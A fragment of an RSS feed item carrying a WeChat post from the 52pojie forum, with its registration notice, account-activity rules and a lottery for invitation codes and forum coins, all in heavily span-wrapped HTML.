initial;">能</span><span style="display: inline-block; text-indent: initial;">找</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">！</span></strong><strong><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">?</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">=</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">q</span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">相</span><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">明</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p><span style="color: rgb(255, 0, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">捐</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">赠</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币</span><span style="display: inline-block; text-indent: initial;">价</span><span style="display: inline-block; text-indent: initial;">值</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">元</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">且</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">险</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">滴</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">【</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">】</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">[</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">]</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">样</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p><span style="background-color: rgb(255, 255, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">并</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">意</span><span style="display: inline-block; text-indent: initial;">味</span><span style="display: inline-block; text-indent: initial;">着</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">已</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">录</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">就</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">续</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">陆</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">导</span><span style="display: inline-block; text-indent: initial;">致</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">贩</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">倒</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">即</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">删</span><span style="display: inline-block; text-indent: initial;">除</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">珍</span><span style="display: inline-block; text-indent: initial;">惜</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">宝</span><span style="display: inline-block; text-indent: initial;">贵</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">给</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">欢</span><span style="display: inline-block; text-indent: initial;">声</span><span style="display: inline-block; text-indent: initial;">笑</span><span style="display: inline-block; text-indent: initial;">语</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">金</span><span style="display: inline-block; text-indent: initial;">钱</span><span style="display: inline-block; text-indent: initial;">衡</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">愉</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li></ul><p><br /></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;"></span><strong><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">（再</span><span style="display: inline-block; text-indent: initial;">抽4</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">）</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">公</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">台</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">“新</span><span style="display: inline-block; text-indent: initial;">福</span><span style="display: inline-block; text-indent: initial;">利</span><span style="display: inline-block; text-indent: initial;">”</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">法，<strong style="letter-spacing: 0.544px;"><span><span style="letter-spacing: 0.544px; text-decoration: underline;"><strong><span><em>上次参加完活动的同学这次参加还需要重新分享上传。</em></span></strong></span></span></strong></span></strong></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;"></span><strong style="letter-spacing: 0.544px;"><span style="display: inline-block; text-indent: initial;">周二3</span></strong><span style="display: inline-block; text-indent: initial;">月12</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">再</span><span style="display: inline-block; text-indent: initial;">送4</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币，防止错过开放注册，强烈建议设置“星标”</span><span style="display: inline-block; text-indent: initial;">。</span></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><br /></strong></span></p><p><em><span style="color: rgb(136, 136, 136); font-size: 14px;"></span></em><em style="letter-spacing: 0.544px;"><span style="color: rgb(136, 136, 136); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">居</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">按</span><span style="display: inline-block; text-indent: initial;">照</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">求</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">截</span><span style="display: inline-block; text-indent: initial;">图</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">也</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">所</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">哦</span><span style="display: inline-block; text-indent: initial;">。</span></span></em></p><p><br /></p><p style="margin-bottom: 0px; color: rgb(53, 53, 53); text-align: start; letter-spacing: 0.544px; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1896511-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 08 Mar 2024 16:22:41 +0800</pubDate>
<pubDate>Fri, 08 Mar 2024 16:22:41 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册微信抽奖活动，先送20个账号注册码或300论坛币，今天下午两点开奖，详见【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140199&amp;idx=1&amp;sn=e27d9a00557d0f9c49a0c83bf2e455af&amp;chksm=bd50a0338a272925dd0f4fee3e76e24437ba4c948d6c1360805a281024baa0316527535198fe&amp;scene=58&amp;subscene=0</link>
